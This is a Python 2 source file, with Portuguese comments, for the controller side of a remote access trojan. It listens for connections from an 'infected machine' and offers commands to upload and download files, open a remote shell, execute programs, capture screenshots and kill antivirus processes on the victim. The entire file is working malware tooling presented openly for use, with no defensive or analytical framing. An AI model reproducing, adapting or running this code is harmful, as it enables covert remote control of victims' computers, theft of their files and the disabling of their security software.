#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

import os
import datetime
import time
import socket
import sha
import subprocess
import sys

# cores
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def ajuda():
    print('{0}Comandos{1}:\n{2}upload{3} - Escolha um arquivo para fazer upload na maquina infectada.').format(YELLOW, END, RED, END)
    print('{0}shell{1} - Para obter uma shell na maquina do cliente.').format(RED, END)
    print('{0}execute{1} - Executa um programa na maquina infectada.\n Ex: execute payload.exe').format(RED, END)
    print('{0}download{1} - Faz o download de um arquivo na maquina infectada para sua maquina.\n Ex: download foto.png').format(RED, END)
    print('{0}screenshot{1} - tira um screenshot da tela do infectado e salva no seu desktop.').format(RED, END)
    print('{0}killav{1} - Mata o processo de antivirus na maquina do infectado. Apenas funciona no Windows').format(RED, END)
    print('{0}clear{1} - Limpa a tela.').format(RED, END)
    print('{0}exit{1} - Sai do programa.').format(RED, END)

def execute(s, nome_programa):
    if(len(nome_programa.split(' ')) == 1):
        try:
            nome_programa = raw_input('Digite o nome do programa: ')
        except KeyboardInterrupt:
            return
    else:
        arquivo = nome_programa.split(' ')
        arquivo.remove('execute')
        nome_programa = ' '.join(arquivo)

    s.send('6')
    s.send(nome_programa)
    retorno = s.recv(1)
    if(retorno == '1'):
        print('Arquivo não existe')
    elif(retorno == '0'):
        print('Executando')

def upload(s, caminho_arquivo=False):
    if(not caminho_arquivo):
        comando = subprocess.Popen('zenity --file-selection --title Escolha_um_arquivo', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        retorno = comando.stdout.read()     # caminho do arquivo selecionado
        nome_arquivo = os.path.basename(retorno)    # nome do arquivo selecionado
        retorno = retorno.replace('\n','')
        caminho_arq = retorno.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
        if(os.path.isfile(retorno)):
            s.send('1') # upload
            print('Enviando arquivo: '+ nome_arquivo)
            try:
                f = open(caminho_arq, 'rb')
            except IOError:
                f = open(retorno, 'rb')
            ler = f.read(1024)
            l = str(nome_arquivo) + '+/-' + ler
            while(l):
                s.send(l)
                l = f.read(1024)
            f.close()
            print('Envio completo ...')
            s.shutdown(socket.SHUT_WR)
        else:
            print('Arquivo inválido ou não é arquivo')
            return
    else:
        pass

def download(s, path):
    caminho = os.path.expanduser('~')+'/Desktop/'
    caminho2 = os.path.expanduser('~')+'/Área\ de\ Trabalho/'
    if(os.path.isdir(caminho)):
        caminho_correto = caminho
    elif(os.path.isdir(caminho2)):
        caminho_correto = caminho2

    if(len(path.split(' ')) == 1):
        try:
            arquivo = raw_input('Nome do arquivo: ')
        except KeyboardInterrupt:
            return
    else:
        arquivo = path.split(' ')
        arquivo.remove('download')
        arquivo = ' '.join(arquivo)


    s.send('3')
    s.send(arquivo)
    existe = s.recv(1024)
    if(existe.split('+/-')[0]=='True'):
        f = open(caminho_correto + arquivo, 'wb')
        j = existe.split('+/-')[1]
        l = s.recv(1024)
        l = j + l
        while(l):
            f.write(l)
            l = s.recv(1024)
        f.close()
        print('Baixado')

    else:
        print('Arquivo ' + arquivo +' não existe.')

def screenshot(s):
    s.send('5')
    retorno = s.recv(1024)
    if(retorno):
        nome = retorno.split('+/-')[0]
        nome = nome.replace('/tmp/', os.path.expanduser('~')+'/Desktop/')
        f = open(nome , 'wb')
        l = retorno.split('+/-')[1]
        while(l):
            f.write(l)
            l = s.recv(1024)
        f.close()
        print('Screenshot salvo na sua area de trabalho')
    else:
        raise socket.error

def killav(s):
    s.send('4')

def shell(s):
    s.send('2') # shell
    while True:
        try:
            executar = raw_input('\33[93m~$ \033[0m')
            s.send(executar)
            if(executar == 'exit'):
                break
            retorno = s.recv(500000)
            if(not retorno):
                print('maquina desconectada, reconectando ...')
                conecta('')
            else:
                print(retorno)
        except KeyboardInterrupt:
            break

def identificador(comand, s):
    comando = comand.split(' ')
    tam = len(comando)
    if(comando[0] == 'upload'):
        upload(s)
    elif(comando[0] == 'shell'):
        shell(s)
    elif(comando[0] == 'download'):
        download(s, comand)
    elif(comando[0] == 'screenshot'):
        screenshot(s)
    elif(comando[0] == 'execute'):
        execute(s, comand)
    elif(comando[0]=='killav'):
        killav(s)
    elif(comando[0] == 'help' or comando[0] == 'ajuda'):
        ajuda()
    elif(comando[0] == 'clear'):
        os.system('clear')
    elif(comando[0] == 'exit'):
        sys.exit('Você escolheu sair')
    else:
        print('{0}Comando errado, digite {1}HELP{2} para obter ajuda dos comandos').format(END, RED, END)
        return

def conecta(ip):
    enviado = False
    while True:
        porta=1025
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_obj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # se der ctrl + c, ele para de escutar na porta
        socket_obj.bind((ip, porta))
        socket_obj.listen(1) # escutando conexões
        if(enviado == False):
            print('{0}[+] Aguardando conexões...').format(GREEN)
        try:
    	    conexao,endereco=socket_obj.accept()
        except KeyboardInterrupt:
            exit()
        retorno = conexao.recv(1024)
        if(enviado == False):
            print(retorno)
        while True:
            try:
                try:
                    comando = raw_input('\033[0m-> ')
                except KeyboardInterrupt:
                    sys.exit()
                identificador(comando, conexao)
            except socket.error as e: # socket.shutdown(socket.SHUT_WR)
                enviado = True
                break

if __name__ == '__main__':
    conecta('')
